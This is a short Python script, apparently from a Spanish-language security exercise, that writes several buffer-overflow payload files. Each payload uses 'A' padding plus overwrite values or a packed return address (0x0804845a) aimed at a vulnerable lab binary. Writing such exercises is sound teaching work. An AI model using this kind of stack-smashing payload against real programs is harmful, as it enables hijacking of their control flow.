from struct import pack

#ej1
f = open('ej1','wb')
f.write('A'*80+'DCBA')

#ej2
f = open('ej2', 'wb')
f.write('A'*70 + '\x04' + '\x03' + '\x02' + '\x01')

#ej3
f = open('ej3', 'wb')
f.write('A'*68+pack('<i', 0x0804845a))

#ej 1 y 3 
f = open('ej1y3', 'wb')
f.write('A'*68+pack('<i', 0x0804845a)+'A'*8+'DCBA')

#ej 2 y 3
f = open('ej2y3', 'wb')
f.write('A'*68+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a))

#ej 1,2 y 3 
f = open('ej1_2y3', 'wb')
f.write('A'*68+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a))
